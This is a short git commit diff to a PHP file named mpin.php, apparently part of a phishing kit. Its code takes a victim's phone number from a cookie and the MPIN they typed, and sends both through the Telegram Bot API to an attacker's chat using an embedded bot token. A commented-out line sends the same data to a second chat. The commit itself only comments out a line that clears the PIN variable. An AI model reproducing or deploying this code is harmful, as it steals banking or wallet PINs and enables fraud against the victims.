e6cdab24796d3560c19be8ddea10c745420f7cf7
NonNomen404 <92431601+NonNomen404@users.noreply.github.com>
2021-11-09 15:55:30 +0700

    Update mpin.php

--- mpin.php
+++ mpin.php
@@ -1,5 +1,5 @@
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-578705759&text=" . $_COOKIE['number'] . " MPIN: " . $nummpin);
-$mpin = NULL;
+//$mpin = NULL;
 
 // other
 //file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-582319954&text=" . $_COOKIE['number'] . " MPIN: " . $nummpin);
